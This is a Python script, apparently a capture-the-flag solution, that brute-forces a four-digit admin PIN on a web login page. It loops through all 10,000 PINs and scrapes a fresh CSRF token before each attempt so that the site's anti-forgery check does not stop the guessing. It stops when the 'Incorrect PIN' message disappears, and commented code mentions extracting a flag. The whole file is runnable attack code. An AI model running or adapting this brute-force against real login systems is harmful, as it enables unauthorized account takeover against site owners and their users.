import requests
from bs4 import BeautifulSoup


def solve():
    url = 'http://admin.inmt.win'

    # We must use Session() or our CSRF token and cookie won't match up across requests
    with requests.Session() as s:
        # Loop between 0 and 9999
        for i in range(10000):
            # Format as a 4 digit string, like '0012'
            pin = f'{i:04}'

            # Print a progress report every 100 attempts
            if i % 100 == 0:
                print(f'Trying PINs starting with {pin}...')

            # Grab the login page to acquire a fresh CSRF token and a session cookie
            res = s.get(url)
            
            # Extract the CSRF token with bs4
            soup = BeautifulSoup(res.text, 'html.parser')
            csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
            
            # Attempt the new PIN
            data = {
                'username': 'admin',
                'pin': pin,
                'csrf_token': csrf_token
            }
            res = s.post(url, data=data)
            
            # Check if there was no error message about an incorrect PIN
            if 'Incorrect PIN' not in res.text:
                print(f'Success! PIN: {pin}')
                print(res.text)

                # After checking the success output, we could cleanly extract the flag
                # soup = BeautifulSoup(res.text, 'html.parser')
                # success_msg = soup.find('p', class_='success').text
                # print(f'Flag: {success_msg}')

                break


if __name__ == '__main__':
    solve()
